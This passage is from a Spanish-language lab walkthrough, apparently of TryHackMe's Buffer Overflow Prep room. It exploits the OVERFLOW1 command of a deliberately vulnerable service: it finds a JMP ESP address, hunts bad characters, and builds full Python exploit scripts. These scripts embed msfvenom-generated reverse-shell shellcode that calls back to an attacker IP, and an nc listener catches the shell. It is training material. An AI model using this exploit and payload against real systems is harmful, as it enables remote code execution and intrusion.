625011EB             0x625011eb : '\xFF\xE4' |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011F7             0x625011f7 : '\xFF\xE4' |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
62501203             0x62501203 : '\xFF\xE4' | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
62501205             0x62501205 : '\xFF\xE4' | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
0BADF00D               Found a total of 9 pointers
```

Inicialmente, escogeremos una de las 2 últimas, debido a que están relacionadas con **ASCII**, quizás nos eviten problemas con malinterpretación de caracteres o algo por el estilo (pero puedes probar con cualquiera).

Yo tomaré `0x62501203`.

Juguemos con el debugger para validar que esa dirección sí contenga la instrucción `JMP ESP`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_debugger_foundJMPESP.png" style="width: 100%;"/>

Existe, todo bien (:

Ahora, podemos asegurarnos que nuestro script va a llegar a la instrucción seteando un **breakpoint**, esto simplemente es un punto que si el programa "toca" o "activa", generará una excepción y el programa esperará ahí.

Para ello damos clic sobre el valor `62501203`, ejecutamos **F2** y ahora la línea debería verse así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_debugger_breakpointJMPESP.png" style="width: 50%;"/>

Nos vamos a nuestro script y para evitar tener que manipular las direcciones y todo esto manualmente, vamos a apoyarnos de la librería [struct](https://docs.python.org/3/library/struct.html):

> ¿Recuerdas en que arquitectura esta guardando los datos el sistema? Lo usaremos acá.

Le pasaremos la dirección en memoria `0x62501203` a la librería para que la empaque y envíe en **little-endian** y como número:

```python
struct.pack('<I', 0x62501203)
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_google_structPYdoc_byteOrder.png" style="width: 100%;"/>

> [https://docs.python.org/3/library/struct.html#byte-order-size-and-alignment](https://docs.python.org/3/library/struct.html#byte-order-size-and-alignment)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_google_structPYdoc_formatChars.png" style="width: 100%;"/>

> [https://docs.python.org/3/library/struct.html#format-characters](https://docs.python.org/3/library/struct.html#format-characters)

Finalmente, el script quedaría así:

```python
#!/usr/bin/python3

import socket
import struct

HOST = "10.10.68.180" # Este valor puede cambiar, pero es por temas de entorno, da igual
PORT = 1337

to_reach_EIP = 1978
to_reach_JMPESP = 0x62501203

try:
    print(f"(+) Modulando y saltando a JMP, eso ESPero.")

    # Connection
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    server.settimeout(5)
    from_server = server.recv(1024)
    
    # Exploit
    payload = (
        b"OVERFLOW1 " +
        b"A" * to_reach_EIP +
        struct.pack('<I', to_reach_JMPESP)
    )

    server.send(payload)

    from_server = server.recv(1024)
    server.close()

except socket.timeout:
    print(f"(+) El programa dejó de responder...")
```

```python
python3 module.py
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_debugger_reachingWithPY_JMPESP.png" style="width: 100%;"/>

EPALEEEEEEEEEEE, saltando y andando!! Llegamos correctamente a la instrucción mediante nuestro script (:

Sigamos que ya estamos cerca!!!!!!

Ya podríamos generar y enviar nuestro código malicioso, ya que tenemos control sobre `ESP`, peeeero podrían surgir errores, para evitarlos existe el siguiente paso.

# Encontrando los caracteres malos [#](#badchars-phase) {#badchars-phase}

> Reeeeiniciamos programa.

Lo dicho, para evitarnos dolores de cabeza con la ejecución de nuestro código malicioso, buscaremos caracteres que puedan llegar a afectar y corromper nuestra explotación, los famosos `badchars`.

* [https://github.com/cytopia/badchars](https://github.com/cytopia/badchars)

Esta es la lista completa de caracteres:

```txt
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Existe uno que por default genera errores y hay que quitar de la lista, el `0x00`:

```txt
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Le damos formato a nuestro script y enviamos, ya entenderemos como encontrar los malitos:

```python
#!/usr/bin/python3

import socket
import struct

HOST = "10.10.68.180"
PORT = 1337

to_reach_EIP = 1978
to_reach_JMPESP = 0x62501203

badchars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
# badchars_found = "\x00"

try:
    print(f"(+) BADchars, la pandilla...")

    # Connection
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    server.settimeout(5)
    from_server = server.recv(1024)
    
    # Exploit
    payload = (
        b"OVERFLOW1 " +
        b"A" * to_reach_EIP +
        struct.pack('<I', to_reach_JMPESP) +
        badchars
    )

    server.send(payload)

    from_server = server.recv(1024)
    server.close()

except socket.timeout:
    print(f"(+) El programa dejó de responder...")
```

```bash
python3 badchars.py
```

El programa en nuestro debugger crashea. Pero no nos interesa, nos enfocaremos en el contenido del registro `ESP`. Miramos la parte de registros, hacemos clic derecho sobre el valor de **ESP** y después `Follow in Dump`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_badchars_debugger_followInDumpESP.png" style="width: 60%;"/>

En la parte de abajo a la izquierda tenemos el valor hexadecimal de toda la data guardada en el **ESP**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_badchars_debugger_followInDumpESP_hexValues.png" style="width: 60%;"/>

La idea es empezar a buscar caracteres que no están siendo correctamente representados. Lo conseguimos simplemente siguiendo la secuencia de los badchars listados anteriormente. Hagamos un ejemplo:

Tenemos la siguiente cadena: `01` `02` `03`, el siguiente debería ser `04`, pero notamos `05`, ahí, entendemos que el carácter `04` está generando una corrupción y no se está representando correctamente, en ese momento sabemos que `04` es un **badchar**. Lo retiraríamos de la cadena de chars y volveríamos a ejecutar el mismo procedimiento, buscando así que todos y cada uno de los caracteres se comporten bien (:

En nuestro dump notamos de primeras un **badchar**: ¿sabes cuál es?

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_badchars_debugger_followInDumpESP_hexValues_badchar_07.png" style="width: 60%;"/>

Correcto, `07` nos está generando problemas, lo retiramos y nuestra lista quedaría:

```txt
\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Tenemos dos badchars por ahora: `\x00\x07`.

> Reiniciamooooooooos...

Volvemos a probar y ya la seguidilla de caracteres estaría correcta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_badchars_debugger_followInDumpESP_hexValues_badchar_07_removed.png" style="width: 60%;"/>

Continuando nuestra revisión encontramos otro:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_badchars_debugger_followInDumpESP_hexValues_badchar_2e.png" style="width: 60%;"/>

El carácter `2e` también está de problemático. Lo borramos de la lista y repetimos...

Repitiendo y repitiendo, obtenemos 4 **badchars**: `\x00\x07\x2e\xa0`.

Listoneeeees, tengámonos MUY en cuenta para la siguiente fase (: Podemos seguir con la creación de nuestro código malicioso y finalmente su ejecución.

# ShellcodeANDO, ejecutANDO comANDO' [#](#shellcode-phase) {#shellcode-phase}

Para crear nuestro código malicioso nos podemos apoyar de `msfvenom` (pero hay otras maneras también de hacerlo):

* [https://github.com/frizb/MSF-Venom-Cheatsheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
* [https://andrew-long.medium.com/msfvenom-cheatsheet-f9e43edae9f1](https://andrew-long.medium.com/msfvenom-cheatsheet-f9e43edae9f1)

---

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.150.251 LPORT=4440 EXITFUNC=thread -f python -b "\x00\x07\x2e\xa0"
```

Le decimos:

* **-p**: Usa un payload que, al momento de ejecutarse, devuelve una CMD de Windows.
* **LHOST**: La dirección IP de atacante en la que queremos recibir la CMD.
* **LPORT**: El puerto de atacante en el que queremos recibir la CMD.
* **EXITFUNC**: Le indicamos al proceso que se desligue de todo, así la tarea se sigue ejecutando externamente al funcionamiento del servicio explotado.
* **-f**: Para indicarle que el formato de salida debe ser para usar en un programa de **Python**.
* **-b**: Le pasamos los **badchars**, así evitará usarlos en el shellcode.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_shellcode_bash_msfvenom_CreatingShellcodeToCMD.png" style="width: 100%;"/>

Copiamos la variable `buf` y la pegamos en nuestro script, así mismo vamos a agregar unos valores "basura" para darle al shellcode un escondite, una forma de evitar posibles detecciones (aunque no hay antivirus ni nada, está bien ponerlo) y también para en dado caso, evitar que el código del programa llegue a sobreescribir nuestro shellcode.

Entonces lo "moveremos" un poquito del inicio del stack para evitar posibles problemas.

```python
#!/usr/bin/python3

import socket
import struct

#HOST = "10.10.68.180"
HOST = "10.10.145.12"
PORT = 1337

to_reach_EIP = 1978
to_reach_JMPESP = 0x62501203
# badchars_found = "\x00\x07\x2e\xa0"
buf =  b""
buf += b"\xbb\xaf\xfe\x71\xad\xd9\xc0\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03\xf5"
buf += b"\xf0\x93\x58\xf5\xe5\xd6\xa3\x05\xf6\xb6\x2a\xe0"
buf += b"\xc7\xf6\x49\x61\x77\xc7\x1a\x27\x74\xac\x4f\xd3"
buf += b"\x0f\xc0\x47\xd4\xb8\x6f\xbe\xdb\x39\xc3\x82\x7a"
buf += b"\xba\x1e\xd7\x5c\x83\xd0\x2a\x9d\xc4\x0d\xc6\xcf"
buf += b"\x9d\x5a\x75\xff\xaa\x17\x46\x74\xe0\xb6\xce\x69"
buf += b"\xb1\xb9\xff\x3c\xc9\xe3\xdf\xbf\x1e\x98\x69\xa7"
buf += b"\x43\xa5\x20\x5c\xb7\x51\xb3\xb4\x89\x9a\x18\xf9"
buf += b"\x25\x69\x60\x3e\x81\x92\x17\x36\xf1\x2f\x20\x8d"
buf += b"\x8b\xeb\xa5\x15\x2b\x7f\x1d\xf1\xcd\xac\xf8\x72"
buf += b"\xc1\x19\x8e\xdc\xc6\x9c\x43\x57\xf2\x15\x62\xb7"
buf += b"\x72\x6d\x41\x13\xde\x35\xe8\x02\xba\x98\x15\x54"
buf += b"\x65\x44\xb0\x1f\x88\x91\xc9\x42\xc5\x56\xe0\x7c"
buf += b"\x15\xf1\x73\x0f\x27\x5e\x28\x87\x0b\x17\xf6\x50"
buf += b"\x6b\x02\x4e\xce\x92\xad\xaf\xc7\x50\xf9\xff\x7f"
buf += b"\x70\x82\x6b\x7f\x7d\x57\x3b\x2f\xd1\x08\xfc\x9f"
buf += b"\x91\xf8\x94\xf5\x1d\x26\x84\xf6\xf7\x4f\x2f\x0d"
buf += b"\x90\x65\xb8\x9b\x9b\x12\xba\xa3\x4a\xbb\x33\x45"
buf += b"\x06\x2b\x12\xde\xbf\xd2\x3f\x94\x5e\x1a\xea\xd1"
buf += b"\x61\x90\x19\x26\x2f\x51\x57\x34\xd8\x91\x22\x66"
buf += b"\x4f\xad\x98\x0e\x13\x3c\x47\xce\x5a\x5d\xd0\x99"
buf += b"\x0b\x93\x29\x4f\xa6\x8a\x83\x6d\x3b\x4a\xeb\x35"
buf += b"\xe0\xaf\xf2\xb4\x65\x8b\xd0\xa6\xb3\x14\x5d\x92"
buf += b"\x6b\x43\x0b\x4c\xca\x3d\xfd\x26\x84\x92\x57\xae"
buf += b"\x51\xd9\x67\xa8\x5d\x34\x1e\x54\xef\xe1\x67\x6b"
buf += b"\xc0\x65\x60\x14\x3c\x16\x8f\xcf\x84\x36\x72\xc5"
buf += b"\xf0\xde\x2b\x8c\xb8\x82\xcb\x7b\xfe\xba\x4f\x89"
buf += b"\x7f\x39\x4f\xf8\x7a\x05\xd7\x11\xf7\x16\xb2\x15"
buf += b"\xa4\x17\x97"

try:
    print(f"(+) Vamo a ShElLc0dEaR esta vuelta!!")

    # Connection
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    server.settimeout(5)
    from_server = server.recv(1024)
    
    # Exploit
    payload = (
        b"OVERFLOW1 " +
        b"A" * to_reach_EIP +  # eip
        struct.pack('<I', to_reach_JMPESP) +  # jmp esp
        b"\x90" * 32 +  # junk data
        buf  # shellcode
    )

    server.send(payload)

    from_server = server.recv(1024)
    server.close()

except socket.timeout:
    print(f"(+) El programa dejó de responder...")
```

Nos ponemos en escucha por el puerto definido en **LPORT**:

```bash
nc -lvp 4440
```

Yyyy:

```bash
python3 shellcode.py
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_shellcode_bash_reverseShellAfterBOF.png" style="width: 100%;"/>

EEEEEEPALEEEEEEEEEEEEEEEEEE!!

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_google_shrekDancingWithHead.gif" style="width: 50%;"/>

Después de todo este camino, hemos explotado correctamente el **buffer overflow basado en pila**, consiguiendo así ejecutar nuestro shellcode sin problema y obteniendo una terminal en el sistema (:

> Ya tienes el camino libre para hacer y deshacer con los demás **OVERFLOW** y programas vulnerables (:

---

# Scripts creados [#](#scripts-created) {#scripts-created}

---

* [fuzzing.py](https://github.com/lanzt/blog/blob/main/assets/scripts/THM/bufferoverflowprep/overflow1/fuzzing.py), buscamos romper el programa.
* [pattern.py](https://github.com/lanzt/blog/blob/main/assets/scripts/THM/bufferoverflowprep/overflow1/pattern.py), somos más específicos y encontramos la parte exacta de crash.
* [overwritEIP.py](https://github.com/lanzt/blog/blob/main/assets/scripts/THM/bufferoverflowprep/overflow1/overwritEIP.py), tomamos control de la siguiente instrucción a ejecutar.
* [module.py](https://github.com/lanzt/blog/blob/main/assets/scripts/THM/bufferoverflowprep/overflow1/module.py), encontramos librerías sin restricciones para poder saltar a la pila.
* [badchars.py](https://github.com/lanzt/blog/blob/main/assets/scripts/THM/bufferoverflowprep/overflow1/badchars.py), evitamos problemas y descartamos caracteres que generen corrupción en la data.
* [shellcode.py](https://github.com/lanzt/blog/blob/main/assets/scripts/THM/bufferoverflowprep/overflow1/shellcode.py), ejecutamos nuestro código malicioso.

...

Es un ataque muy lindo, algo complicado de entender al inicio, pero con la práctica, te emociona verlo :P

Espero que lo hayas disfrutado, que aunque quedo muy largo, siento que se detalló en lo que se debía detallar y se aclararon algunos temas importantes. Además, ya este post me queda como guía personal de un **buffer overflow stack-based**, así que para la prox no hay que explicar 😬

Me cuentas que tal te fue con los demás, cualquier cosa me charlas por el discord de s4vitar o por twitter.

¡A romper de todo y nos leeremos pronto!